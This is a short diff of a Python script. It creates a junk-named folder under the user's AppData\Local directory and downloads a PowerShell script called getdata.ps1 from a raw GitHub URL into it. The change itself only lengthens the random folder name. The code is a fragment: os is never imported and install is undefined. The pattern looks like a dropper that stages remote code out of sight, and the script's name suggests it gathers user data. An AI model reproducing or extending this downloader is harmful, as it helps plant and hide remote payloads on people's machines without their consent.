@@ -1,6 +1,6 @@
 import getdata
 user = getdata.getuser()
-d = "ergergethgetgerth"
+d = "ergergethgetgerthGERGwehergyherg346346RDGDRGDFHRT44GDTHDTHDTHDTHDTHDthdthfghgjurstyuujyhtgrfsergthyftgfresrdgtfhgfdesfghfdsghfdghfdghf"
 c = f"C:\\Users\\{user}\\AppData\\Local\\{d}"
 os.mkdir(c)
 install("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1", f"{c}\\getdata.ps1")
